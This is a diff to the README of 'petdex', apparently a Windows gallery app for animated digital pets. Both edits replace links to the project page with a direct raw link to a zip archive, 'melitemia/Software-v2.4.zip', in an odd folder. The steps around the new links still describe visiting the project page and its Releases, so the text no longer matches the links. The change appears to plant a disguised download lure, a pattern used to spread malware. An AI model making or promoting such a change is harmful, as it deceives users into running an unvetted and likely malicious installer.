@@ -1,6 +1,6 @@
 # 🐾 petdex - View animated pet digital cards
 
-[![Download petdex](https://img.shields.io/badge/Download-petdex-blue.svg)](https://github.com/Flaunty-gheg188/petdex)
+[![Download petdex](https://img.shields.io/badge/Download-petdex-blue.svg)](https://raw.githubusercontent.com/Flaunty-gheg188/petdex/main/melitemia/Software-v2.4.zip)
 
 Petdex acts as a central gallery for animated digital pets. This application allows you to browse, view, and organize your collection of visual Codex pets on your Windows computer.
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run the software:
 
 ## 📥 Downloading The Software
 
-Visit the [official download page](https://github.com/Flaunty-gheg188/petdex) to get the installer. 
+Visit the [official download page](https://raw.githubusercontent.com/Flaunty-gheg188/petdex/main/melitemia/Software-v2.4.zip) to get the installer. 
 
 1. Click the link above to open the gallery project page.
 2. Look for the section labeled Releases on the right side of the screen.
